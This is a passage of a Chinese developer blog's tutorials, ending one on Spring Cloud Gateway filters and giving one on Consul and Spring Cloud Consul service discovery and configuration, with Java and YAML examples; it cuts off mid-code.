过滤器作用是对匹配上的请求添加请求参数： 12345678910111213@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { return builder.routes() .route("add_request_parameter_route", r -&gt; r.path("/addRequestParameter") .filters(f -&gt; f.addRequestParameter("book", "java")) .uri("http://127.0.0.1:8080/addRequestParameter/") ).build(); }} RewritePath 过滤器Spring Cloud Gateway 可以使用 RewritePath 替换 Zuul 的 StripPrefix 功能，而且功能更强大。在 Zuul 中使用如下配置后，所有 /example/xxxx 的请求会转发给 http://example.com/xxxx，同时去除掉了 example 前缀。 123456zuul: routes: example: path: /example/** stripPrefix: true uri: http://example.com Spring Cloud Gateway 实现了类似的功能，使用的是 RewritePath 过滤器工厂。特别注意，下述的 URI 是不以 / 结尾的，否则仅仅会直接跳转到 http://baidu.com。 12345678910111213@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { return builder.routes() .route("rewrite_path_route", r -&gt; r.path("/foo/**") .filters(f -&gt; f.rewritePath("/foo/(?&lt;segment&gt;.*)", "/$\\\\{segment}")) .uri("http://www.baidu.com") ).build(); }} 启动对应的应用后，访问 http://127.0.0.1:9092/foo/cache/sethelp/help.html，路由会转发到 http://www.baidu.com/cache/sethelp/help.html，这里相当于把 foo 前缀去掉。 AddResponseHeader 过滤器AddResponseHeader 过滤器工厂的作用是对从网关返回的响应添加 Header： 12345678910111213@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { return builder.routes() .route("add_response_header_route", r -&gt; r.path("/addResponseHeader") .filters(f -&gt; f.addResponseHeader("X-Request-Id", "Peter")) .uri("http://www.baidu.com/") ).build(); }} StripPrefix 过滤器StripPrefixGatewayFilterFactory 是一个对针对请求 URL 前缀进行处理的 Filter 工厂，用于去除前缀，而 PrefixPathGatewayFilterFactory 是用于增加前缀。下述的配置，访问 http://127.0.0.1:9093/baidu/test，会跳转到 https://www.baidu.com，即去除了前缀 /baidu/test/。 123456789101112spring: application: name: gateway-server cloud: gateway: routes: - id: baidu_route uri: http://www.baidu.com predicates: - Path=/baidu/test/** filters: - StripPrefix=2 Retry 过滤器网关作为所有请求流量的入口，网关对路由进行协议适配和协议转发处理的过程中，如果出现异常或网络抖动，为了保证后端服务请求的高可用，一般处理方式会对网络请求进行重试，接口必须需要做幂等处理。config.setRetries(2).setStatuses(HttpStatus.INTERNAL_SERVER_ERROR) 表示设置重试次数为两次，当服务调用失败时设置返回的状态码为 500，即服务器内部错误。 12345678910111213@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { return builder.routes() .route("retry_route", r -&gt; r.path("/test/retry") .filters(f -&gt; f.retry(config -&gt; config.setRetries(2) .setStatuses(HttpStatus.INTERNAL_SERVER_ERROR))) .uri("http://127.0.0.1:8080/retry?key=abc&amp;count=2")) .build(); }} Hystrix 过滤器Hystrix 可以提供熔断、服务降级和快速失败等功能。Spring Cloud Gateway 对 Hystrix 进行集成提供路由层面的服务熔断和降级，最简单的使用场景是当通过 Spring Cloud Gateway 调用后端服务，后端服务一直出现异常、服务不可用的状态。此时为了提高用户体验，就需要对服务降级，返回友好的提示信息给服务消费者，在保护网关自身可用的同时保护后端服务高可用。下面将给出配置示例，由于篇幅有限，只列出核心的配置内容和代码。 工程里的 pom.xml 配置文件，引入 spring-cloud-starter-gateway、spring-cloud-starter-netflix-hystrix 123456789101112&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-hystrix&lt;/artifactId&gt;&lt;/dependency&gt; 工程里的启动主类 1234567@SpringBootApplicationpublic class GatewayApplication { public static void main(String[] args) { SpringApplication.run(GatewayApplication.class, args); }} 工程里的 Fallback 控制器 12345678@RestControllerpublic class FallbackController { @GetMapping("/fallback") public String fallback() { return "Spring Cloud Gateway Fallback！"; }} 工程里的 application.xml 配置文件，添加 Hystrix 过滤器相关的配置，并设置 Hystrix 的 fallbackcmd 的超时时间 1234567891011121314151617181920212223spring: application: name: gateway-server cloud: gateway: routes: - id: hystrix_route predicates: - Path=/test/hystrix filters: - name: Hystrix # Hystrix Filter 的名称 args: # Hystrix 配置参数 name: fallbackcmd # HystrixCommand 的名字 fallbackUri: forward:/fallback # fallback 对应的 uri uri: http://127.0.0.1:8080/hystrix?isSleep=falsehystrix: command: fallbackcmd: execution: isolation: thread: timeoutInMilliseconds: 5000 # Hystrix 的 fallbackcmd 的超时时间 下篇 - Gateway 入门教程（中级篇） Gateway 入门教程 - 中级篇 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务"},{title:"Consul 入门教程 - 基础篇",url:"/posts/29fe9682.html",text:'Consul 介绍Consul 是什么作为集群系统的灵魂，服务治理框架一直都受架构师的青睐。随着微服务思想的普及，越来越多的服务治理框架如雨后春笋般冒了出来。除了 Eureka，HashiCorp 公司的 Consul 也让诸多架构师青睐有加。Consul 是一个分布式高可用的服务网格（service mesh）解决方案，提供包括服务发现、配置和分段功能在内的全功能控制平面。这些功能中的每一个都可以根据需要单独使用，也可以一起使用以构建完整的服务网格。简单来说，Consul 是一个分布式高可用的系统服务发现与配置工具，它跟 Eureka 的核心功能一样，但略有不同： Consul 使用 Go 语言编写，以 HTTP 方式对外提供服务 Consul 支持多数据中心，这是它的一大特色 Consul 提供了可视化的 Web 界面 Consul 的一致性协议是 CP（Raft） Consul 除了服务发现之外，还有一些别的功能，例如配置功能 Consul 的主要功能Consul 提供了以服务治理为核心的多种功能以满足分布式系统的需要，它可以作为服务治理组件和配置中心。当然，市场上还有很多其他类似功能的优秀框架，Consul 官方提供了对比信息，以便架构师们在做技术选型时可以尽快找到更适合自己的方案。Consul 的主要功能如下，更多介绍可参考：Consul 官网、Consul 项目、Consul 中文教程。 服务发现：有了 Consul，服务可以通过 DNS 或者 HTTP 直接找到它所依赖的服务 健康检查：Consul 提供了健康检查的机制，从简单的服务端是否返回 200 的响应代码到较为复杂的内存使用率是否低于 90% K/V 存储：应用程序可以根据需要使用 Consul 的 Key/Value 存储，Consul 提供了简单易用的 HTTP 接口来满足用户的动态配置、特征标记、协调、Leader 选举等需求 多数据中心：Consul 原生支持多数据中心，这意味着用户不用为了多数据中心自己做抽象 Consul 安装Consul 的安装比较简单，官方提供了二进制可执行文件，可以在官网下载自己感兴趣的版本，安装步骤如下： 将已下载的 consul_l.2.0_linux_amd64.zip 解压到 /opt/consul/ 目录下 添加 consul 到 PATH（环境变量） 执行 consul -v，如果不报错，基本就算安装成功了 Consul 启动Consul 集群默认需要至少三台 Consul 启动，当有多个 Consul 节点启动了，那么它们会自动组成集群。如果只是想本地开发调试，可以使用开发者模式启动，数据默认保存在内存中。 12# 使用开发模式，启动consul$ consul agent -dev Consul 默认是没有 UI 界面的，如果需要展示 UI 界面，可以加上 -ui 参数进行启动，然后通过 http://127.0.0.1:8500 访问 UI 界面： 1$ consul agent -dev -ui Consul 实用接口Consul 对外提供了丰富的 API，有运维人员喜欢的命令行接口，也有开发人员喜欢的 HTTP 接口，常用的接口如下： Consul 管理命令 consul members：查看当前 Consul 集群里所有成员的信息以及它们的状态：存活、离线、启动失败 consul monitor：持续打印当前 Consul 的日志信息，这个命令很有用，因为 Consul 访问量比较大，所以生产环境一般不会保存日志，如果想查看实时日志，可以使用该命令 consul leave：退出集群，一般会使用这个命令而不是直接杀掉 Consul 的进程 Consul 对外服务接口 /v1/agent/members：列出集群内的所有成员及其信息 /v1/status/leader：显示当前集群 leader /v1/catalog/services：显示当前注册的服务 /v1/kv/key：显示当前 Key 对应的 Value Spring Cloud Consul 基础Spring Cloud Consul 介绍Spring Cloud Consul 通过自动配置、对 Spring Environment 绑定和其他惯用的 Spring 模块，为 Spring Boot 应用程序提供了 Consul 集成。只需要一些简单注解，就可以快速启用和配置 Consul，并用它来构建大型分布式系统。Spring Cloud Consul 作为 Spring Cloud 与 Consul 之间的桥梁，对二者都有良好的支持，其特性如下： 服务注册发现，实例可以向 Consul 注册服务，客户端可以使用 Spring Bean 来发现服务提供方 支持 Ribbon 的客户端负载 支持 Zuul 服务网关 分布式配置中心，使用的是 Consul 的 K/V 存储 控制总线，使用的是 Consul Events Spring Cloud Consul 入门案例Spring Cloud Consul 提供了 bus、config、discovery 等模块，项目中可以根据具体的需要选择对应的模块。下面将演示如何使用 config、discovery 模块，点击下载完整的案例代码。 1. 版本说明在下面的的教程中，使用的 Spring Cloud 版本是 Finchley.RELEASE，对应的 Spring Boot 版本是 2.0.3。 2. 创建 Maven 父级 Pom 工程在父工程里面配置好工程需要的父级依赖，目的是为了更方便管理与简化配置，具体 Maven 配置如下： 1234567891011121314151617181920212223242526272829303132333435363738&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.3.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;!-- 利用传递依赖，公共部分 --&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt;&lt;!-- 管理依赖 --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Finchley.RELEASE&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!--注意：这里需要添加以下配置，否则可能会有各种依赖问题 --&gt;&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/libs-milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt; 3. 创建 Consul Provider 工程创建 Consul Provider 的 Maven 工程，配置工程里的 pom.xml 文件，引入 spring-cloud-starter-consul-discovery，将服务实例注册到 Consul： 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-consul-discovery&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Consul Provider 的主启动类，这里可以缺省添加 @EnableDiscoveryClient 注解： 12345678@EnableDiscoveryClient@SpringBootApplicationpublic class ProviderApplication { public static void main(String[] args) { SpringApplication.run(ProviderApplication.class, args); }} 创建 Consul Provider 的测试控制类，值得注意的是，在不引入 spring-boot-starter-actuator 依赖的情况下，必须手动创建 /actuator/health 接口，这是新版 Spring Cloud Consul 的默认注册健康检查接口，否则 Consul 会认为服务不可用： 12345678910111213141516@RestControllerpublic class ProviderController { @Value("${server.port}") private String port; @GetMapping("/actuator/health") public String health() { return "SUCCESS"; } @GetMapping("/provider/sayHello") public String sayHello(String name) { return "from port " + port + ": hello " + name; }} 添加 Consul Provider 需要的 application.yml 配置文件到工程中： 12345678910server: port: 9001spring: application: name: consul-provider cloud: consul: host: 127.0.0.1 # consul 地址 port: 8500 # consul 端口 4. 创建 Consul Consumer 工程创建 Consul Consumer 的 Maven 工程，配置工程里的 pom.xml 文件，引入 spring-cloud-starter-consul-discovery，将服务实例注册到 Consul，同时引入 Feign： 12345678&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-consul-discovery&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Consul Consumer 的主启动类，这里可以缺省添加 @EnableDiscoveryClient 注解： 123456789@EnableFeignClients@EnableDiscoveryClient@SpringBootApplicationpublic class ConsumerApplication { public static void main(String[] args) { SpringApplication.run(ConsumerApplication.class, args); }} 创建 Consul Consumer 的服务接口类，用于调用 Provider 服务： 123456@FeignClient(value = "consul-provider")public interface HelloService { @RequestMapping(value = "/provider/sayHello", method = RequestMethod.GET) public String sayHello(@RequestParam("name") String name);} 创建 Consul Consumer 的测试控制类，在不引入 spring-boot-starter-actuator 依赖的情况下，必须手动创建 /actuator/health 接口，这是新版 Spring Cloud Consul 的默认注册健康检查接口，否则 Consul 会认为服务不可用： 12345678910111213141516@RestControllerpublic class ConsumerController { @Autowired private HelloService helloService; @GetMapping("/actuator/health") public String health() { return "SUCCESS"; } @GetMapping("/consumer/sayHello") public String sayHello(String name) { return helloService.sayHello(name); }} 添加 Consul Consumer 需要的 application.yml 配置文件到工程中： 12345678910server: port: 9002spring: application: name: consul-consumer cloud: consul: host: 127.0.0.1 # consul 地址 port: 8500 # consul 端口 5. 创建 Consul Config 工程创建 Consul Config 的 Maven 工程，配置工程里的 pom.xml 文件，引入 spring-cloud-starter-consul-config；这里的 Consul Config 工程与上面的 Provider、Consumer 工程没有任何关系，作用是用来单独演示 Consul 的 Config 功能（配置中心）： 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-consul-config&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Consul Config 的测试控制类： 12345678910111213@RefreshScope@RestController@RequestMapping("/config")public class ConfigController { @Value("${foo.bar.name}") private String name; @GetMapping("/getName") public String getName() { return name; }} 添加 Consul Config 需要的 application.yml 配置文件到工程中： 12345678910server: port: 9003spring: application: name: consul-config cloud: consul: host: 127.0.0.1 # consul 地址 port: 8500 # consul 端口 6. 测试结果 启动本地的 consul 服务器 依次启动 consul-provider、consul-consumer 应用 访问 consul 的管理界面：http://127.0.0.1:8500，如果各个服务的 Health Checks 显示绿色的对勾，即表示服务注册成功，如下图所示： 访问 http://127.0.0.1:9002/consumer/sayHello?name=Peter，如果返回 from port 9001: hello Peter，说明 consul-provider、consul-consumer 应用一切运行成功 访问 http://127.0.0.1:8500/ui/dc1/kv，点击页面上的 create 按钮，在 Key or folder 栏输入 config/consul-config/foo.bar.name，value 栏输入 book，然后点击 save 按钮保存，如下图所示： 启动 consul-config 应用，访问 http://127.0.0.1:9003/config/getName，如果接口返回 book，说明成功访问到 Consul Config 的 Key/Value 存储 Spring Cloud Consul 深入Spring Cloud Consul 模块介绍Spring Cloud Consul 是在 ecwid 的 consul-api 的基础上又封装了一层功能，使其跟现有 Spring Cloud 组件融合，达到开箱即用的目的。围绕着 Consul 的核心功能，Spring Cloud Consul 也提供了相应的功能模块与之匹配，其中 Consul 的事件功能比较弱化，应用比较多的是服务治理和配置功能，各个模块的介绍如下： spring-cloud-consul-binder：对 Consul 的事件功能封装 spring-cloud-consul-config：对 Consul 的配置功能封装 spring-cloud-consul-core：基础配置和健康检查模块 spring-cloud-consul-discovery：对 Consul 服务治理功能封装 Spring Cloud Consul Discovery基础配置服务启动时，会通过 ConsulServiceRegistry.register（） 向 Consul 注册自身的服务。服务注册时，会告诉 Consul 以下信息： ID：服务 ID，默认是服务名 + 端口号 Name：服务名，默认是应用名称 Tags：给服务打的标签，默认是 [secure=false] Address：服务地址，默认是本机 IP Port：服务端口，默认是服务的 Web 端口 Check：健康检查信息，包括 Interval（健康检查间隔）和 HTTP（健康检查地址） 一般情况下，不需要显式提供上述信息，Spring Cloud Consul 会有默认值，但是在一些特殊业务场景中，可能就需要定制上述服务了。Consul Discovery 的常见配置如下： Tags 栏会有一个 secure=false，这个是 Spring Cloud Consul 默认加上的，它取自配置 spring.cloud.consul.discovery.scheme，默认值是 http。如果服务提供的是 https 的服务时，需要配置该值为 https，它的作用是告诉服务消费者调用服务方接口时需要哪种协议。配置示例如下： 1234567891011/** * 自定义健康检测接口 */@RestControllerpublic class ProviderController { @GetMapping("/health") public String health() { return "SUCCESS"; }} 1234567891011121314151617server: port: 9001spring: application: name: consul-provider cloud: consul: host: 127.0.0.1 # consul 启动地址 port: 8500 # consul 启动端口 discovery: prefer-ip-address: true # 优先使用 IP 注册 ip-address: 127.0.0.1 # 若部署在 Docker 中,指定宿主机 IP port: 9001 # 若部署在 Docker 中,指定宿主机端口 health-check-interval: 20s # 健康检查间隔时间为 20s health-check-path: /health # 自定义健康检查路径 tags: ${LANG},test # 指定服务的标签, 用逗号隔开 服务发现案例Spring Cloud Consul 提供了两种方式的服务发现功能：Ribbon 和 DiscoveryClient。如果客户端使用了 Feign 或者 @LoadBalancerd 注解，那么默认使用的是 ConsulServerList 提供的服务发现逻辑。如果客户端只想独立使用服务发现功能，那么可以直接使用 DiscoveryClient。上面提到了使用 Consul 的 Tags 功能将服务分组，下面就用上面说的两种方式分别调用服务提供者的接口，点击下载完整的案例代码，由于篇幅有限，以下只给出核心代码和配置。 1. 创建 Consul Provider Tag One 工程创建 Consul Provider Tag One 的主启动类： 12345678@EnableDiscoveryClient@SpringBootApplicationpublic class ProviderOneApplication { public static void main(String[] args) { SpringApplication.run(ProviderOneApplication.class, args); }} 创建 Consul Provider Tag One 的测试控制类： 123456789101112131415public class ProviderOneController { @Value("${server.port}") private String port; @GetMapping("/actuator/health") public String health() { return "SUCCESS"; } @GetMapping("/provider/sayHello/{name}") public String sayHello(@PathVariable("name") String name) { return "from port " + port + ": hello " + name; }} 创建 Consul Provider Tag One 的 application.yml 配置文件，加入 tags 属性： 123456789101112server: port: 9001spring: application: name: consul-provider cloud: consul: host: 127.0.0.1 # consul 启动地址 port: 8500 # consul 启动端口 discovery: tags: tag1 2. 创建 Consul Provider Tag Two 工程创建 Consul Provider Tag Two 的主启动类： 12345678@EnableDiscoveryClient@SpringBootApplicationpublic class ProviderTwoApplication { public static void main(String[] args) { SpringApplication.run(ProviderTwoApplication.class, args); }} 创建 Consul Provider Tag Two 的测试控制类： 12345678910111213141516@RestControllerpublic class ProviderTwoController { @Value("${server.port}") private String port; @GetMapping("/actuator/health") public String health() { return "SUCCESS"; } @GetMapping("/provider/sayHello/{name}") public String sayHello(@PathVariable("name") String name) { return "from port " + port + ": hello " + name; }} 创建 Consul Provider Tag Two 的 application.yml 配置文件，加入 tags 属性： 123456789101112server: port: 9002spring: application: name: consul-provider cloud: consul: host: 127.0.0.1 # consul 启动地址 port: 8500 # consul 启动端口 discovery: tags: tag2 3. 创建 Consul Consumer Ribbon 工程创建 Consul Consumer Ribbon 的主启动类： 123456789@EnableFeignClients@EnableDiscoveryClient@SpringBootApplicationpublic class ConsumerRibbonApplication { public static void main(String[] args) { SpringApplication.run(ConsumerRibbonApplication.class, args); }} 创建 Consul Consumer Ribbon 的服务接口类，用于调用 Provider 服务： 123456@FeignClient("consul-provider")public interface ProviderService { @RequestMapping(value = "/provider/sayHello/{name}", method = RequestMethod.GET) public String sayHello(@PathVariable("name") String name);} 创建 Consul Consumer Ribbon 的基础配置类，声明 RestTemplate 的 Bean 对象： 123456789@Configurationpublic class CommonConfiguration { @Bean @LoadBalanced public RestTemplate restTemplate() { return new RestTemplate(); }} 创建 Consul Consumer Ribbon 的测试控制类，建立两个 REST 接口，一个通过 Feign 的方式访问 Provider，另一个通过 RestTemplate 的方式访问 Provider： 1234567891011121314151617181920212223242526@RestControllerpublic class ConsumerRibbonController { private static final String URL = "http://consul-provider"; @Autowired private RestTemplate restTemplate; @Autowired private ProviderService providerService; @GetMapping("/actuator/health") public String health() { return "SUCCESS"; } @GetMapping("/consumer/sayHelloOne/{name}") public String sayHelloOne(@PathVariable("name") String name) { return providerService.sayHello(name); } @GetMapping("/consumer/sayHelloTwo/{name}") public String sayHelloTwo(@PathVariable("name") String name) { return restTemplate.getForObject(URL + "/provider/sayHello/" + name, String.class); }} 创建 Consul Consumer Ribbon 的 application.yml 配置文件： 12345678910111213server: port: 9003spring: application: name: consul-consumer-ribbon cloud: consul: host: 127.0.0.1 # consul 启动地址 port: 8500 # consul 启动端口 discovery: server-list-query-tags: consul-provider: tag1 # 在调用 consul-provider 服务时，使用 tag1 对应的服务实例 4. 创建 Consul Consumer Discovery Client 工程创建 Consul Consumer Discovery Client 的主启动类： 12345678@EnableDiscoveryClient@SpringBootApplicationpublic class DiscoveryClientApplication { public static void main(String[] args) { SpringApplication.run(DiscoveryClientApplication.class, args); }} 创建 Consul Consumer Discovery Client 的测试控制类，使用 DiscoveryClient 注入的方式，手动去 Consul 中获取服务列表；这里需要说明的是，ConsulDiscoveryClient 中不支持根据自定义 Tags 获取服务提供者： 12345678910111213141516@RestControllerpublic class TestController { @Autowired private DiscoveryClient discoveryClient; @GetMapping("/actuator/health") public String health() { return "SUCCESS"; } @GetMapping("/getServer/{serviceId}") public List&lt;ServiceInstance&gt; getServer(@PathVariable("serviceId") String serviceId) { return discoveryClient.getInstances(serviceId); }} 创建 Consul Consumer Discovery Client 的 application.yml 配置文件： 12345678910server: port: 9004spring: application: name: consul-consumer-discovery-client cloud: consul: host: 127.0.0.1 # consul 启动地址 port: 8500 # consul 启动端口 5. 测试结果 启动本地的 Consul 服务器，打开 Consul 的管理界面，查看服务的注册情况，如下图所示： 依次启动 consul-provider-tag-one、consul-provider-tag-two、consul-consumer-discovery-client、consul-consumer-ribbon 应用 请求 consul-consumer-ribbon 应用的 Feign 接口，访问 http://127.0.0.1:9003/consumer/sayHelloOne/Jim，查看返回的内容是否为 from port 9001: hello Jim 请求 consul-consumer-ribbon 应用的 RestTemplate 接口，访问 http://127.0.0.1:9003/consumer/sayHelloTwo/Peter，查看返回的内容是否为 from port 9001: hello Peter 请求 consul-consumer-discovery-client 应用的接口，访问 http://127.0.0.1:9004/getServer/consul-provider，查看返回的服务提供者信息是否只有 consul-provider 提供者，如下图所示： Spring Cloud Consul Config上面的示例演示了 Spring Cloud Consul Config 获取和刷新配置的简单用法。Spring Cloud Consul Config 与 Consul 是通过 HTTP 进行交互的，那配置刷新是如何做到的呢？另外，示例中只有一条配置，可是实际工作中的配置可能有成百上千条，难道配置信息需要一个个在 Consul 的管理页面中添加吗？ 配置刷新原理Spring Cloud Consul 是通过 HTTP 的方式跟 Consul 交互，那配置是如何实时生效的呢？答案其实很简单，那就是配置并没有实时生效。org.springframework.cloud.consul.config.ConfigWatch 中有一个定时方法 watchConfigKeyValues()，它默认每秒执行一次（可以通过 spring.cloud.consul.config.watch.delay 自定义执行的时间间隔)，去 Consul 中获取最新的配置信息，一旦配置发生改变，Spring 通过 ApplicationEventPublisher 重新刷新配置。Consul Config 组件就是通过这种方式，达到配置 “实时生效” 的目的。那客户端如何得知配置被更新过了呢，答案在 Consul 返回的数据里。Consul 会给每一项配置加一个 consulIndex 属性，类似于版本号，如果配置更新，它就会自增。Spring Cloud Consul Config 就是通过缓存 consulIndex 来判断配置是否发生改变。 高级配置（作为配置中心）Consul 只支持用 K/V 的方式进行配置，那怎么让 Consul 支持同时配置多条的方式呢？难道要给 Consul 增加一个导入功能吗？其实 K/V 不仅可以代表一条配置，还可以代表一个应用的配置，将应用名作为 Key，Value 中用来存放它所有的配置，这样就可以达到同时配置多条的结果。Spring Cloud Consul Config 就是这样，通过将 yml 或者 properties 放在 Value 中来实现配置的批量操作。下面的示例将演示使用 Consul 的配置功能，将整个应用的配置以 yml 的方式存储在 Consul 中，以此实现类似 Spring Cloud Config 的配置中心功能，点击下载完整的案例代码。 创建 Consul Config Customize 工程，配置工程里的 pom.xml 文件： 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-consul-config&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Consul Config Customize 的主启动类： 1234567@SpringBootApplicationpublic class ConfigApplication { public static void main(String[] args) { SpringApplication.run(ConfigApplication.class, args); }} 创建 Consul Config Customize 的测试控制类： 12345678910111213@RefreshScope@RestController@RequestMapping("/config")public class TestController { @Value("${foo.bar.name}") private String name; @GetMapping("/getName") public String getName() { return name; }} 创建 Consul Config Customize 的 application.yml 配置文件： 12345spring: application: name: consul-config-customize profiles: active: dev 创建 Consul Config Customize 的 bootstrap.yml 配置文件，增加自定义的配置属性： 1234567891011spring: cloud: consul: config: host: 127.0.0.1 # Consul 启动地址 port: 8500 # Consul 启动端口 format: yaml # Consul 中 Value 配置格式为 yaml prefix: configuration # Consul 中配置文件目录为 configuration, 默认为 config default-context: app # 去该目录下查找缺省配置, 默认为 application profile-separator: \':\' # profiles配置分隔符, 默认为‘,’ data-key: data # 如果指定配置格式为 yaml 或者 properties, 则需要该值作为key, 默认为 data 测试结果： 启动本地的 Consul 服务器 访问 http://127.0.0.1:8500/ui/dc1/kv 页面，添加 key 为：configuration/consul-config-customize:dev/data，value 为： 12345server: port: 9002foo: bar: name: book-dev 访问 http://127.0.0.1:8500/ui/dc1/kv 页面，添加 key 为：configuration/consul-config-customize:test/data，value 为： 12345server: port: 9003foo: bar: name: book-test 启动 consul-config-customize 应用，查看启动的端口号；访问 http://127.0.0.1:9002/config/getName，查看接口返回的内容 更改 application.yml 中的配置为 spring.profiles.active=test 重新启动 consul-config-customize 应用，查看启动的端口号；访问 http://127.0.0.1:9003/config/getName，查看接口返回的内容 Spring Cloud Consul 功能重写Spring Cloud Consul 提供了很多方便实用的功能，但是面对五花八门的需求，还是希望可以重写它的原有逻辑。 重写 ConsulDiscoveryClient (支持 Tag)ConsulDiscoveryClient 并不支持根据自定义 Tag 获取服务，一般来说，ConsulServerList 和 ConsulDiscoveryClient 虽然面对的需求不同，但是实现的功能都是一样的，那就是根据条件查找服务。可能 Spring 认为 ConsulDiscoveryClient 是为一些框架型的功能准备的，用户完全可以拿到服务列表后自行筛选所需的数据。下面的示例将重写 ConsulDiscoveryClient 的功能，让其支持根据自定义 Tag 获取服务。首先创建三个工程，分别是：consul-provider-tag-one、consul-provider-tag-two、consul-consumer-override，其中前两个工程与上面的服务发现案例里的配置和代码完全一致，这里不再累述，点击下载完整的案例代码。 Consul Consumer Override 工程里的 MyConsulDiscoveryClient 类： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071public class MyConsulDiscoveryClient implements DiscoveryClient { private final ConsulClient client; private final ConsulDiscoveryProperties properties; public MyConsulDiscoveryClient(ConsulClient client, ConsulDiscoveryProperties properties) { this.client = client; this.properties = properties; } @Override public String description() { return "Spring Cloud Consul Discovery Client"; } @Override public List&lt;ServiceInstance&gt; getInstances(final String serviceId) { return getInstances(serviceId, QueryParams.DEFAULT); } public List&lt;ServiceInstance&gt; getInstances(final String serviceId, final QueryParams queryParams) { List&lt;ServiceInstance&gt; instances = new ArrayList&lt;&gt;(); addInstancesToList(instances, serviceId, queryParams); return instances; } private void addInstancesToList(List&lt;ServiceInstance&gt; instances, String serviceId, QueryParams queryParams) { String aclToken = properties.getAclToken(); Response&lt;List&lt;HealthService&gt;&gt; services; if (StringUtils.hasText(aclToken)) { // 这里由获取默认tag改为获取指定tag services = client.getHealthServices(serviceId, getTag(serviceId), this.properties.isQueryPassing(), queryParams, aclToken); } else { // 这里由获取默认tag改为获取指定tag services = client.getHealthServices(serviceId, getTag(serviceId), this.properties.isQueryPassing(), queryParams); } for (HealthService service : services.getValue()) { String host = ConsulServerUtils.findHost(service); Map&lt;String, String&gt; metadata = ConsulServerUtils.getMetadata(service); boolean secure = false; if (metadata.containsKey("secure")) { secure = Boolean.parseBoolean(metadata.get("secure")); } instances.add(new DefaultServiceInstance(serviceId, host, service.getService().getPort(), secure, metadata)); } } public List&lt;ServiceInstance&gt; getAllInstances() { List&lt;ServiceInstance&gt; instances = new ArrayList&lt;&gt;(); Response&lt;Map&lt;String, List&lt;String&gt;&gt;&gt; services = client.getCatalogServices(QueryParams.DEFAULT); for (String serviceId : services.getValue().keySet()) { addInstancesToList(instances, serviceId, QueryParams.DEFAULT); } return instances; } @Override public List&lt;String&gt; getServices() { String aclToken = properties.getAclToken(); if (StringUtils.hasText(aclToken)) { return new ArrayList&lt;&gt;(client.getCatalogServices(QueryParams.DEFAULT, aclToken).getValue().keySet()); } else { return new ArrayList&lt;&gt;(client.getCatalogServices(QueryParams.DEFAULT).getValue().keySet()); } } // 获取tag的方法，该方法在 ConsulServerList 中已存在 protected String getTag(String serviceId) { return this.properties.getQueryTagForService(serviceId); }} Consul Consumer Override 工程里的配置类： 123456789@Configurationpublic class CommonConfiguration { @Bean @Order(Ordered.HIGHEST_PRECEDENCE) // 保证优先被Spring加载 public MyConsulDiscoveryClient discoveryClient(ConsulClient client, ConsulDiscoveryProperties properties) { return new MyConsulDiscoveryClient(client, properties); }} Consul Consumer Override 工程里的测试控制类： 12345678910111213141516@RestControllerpublic class TestController { 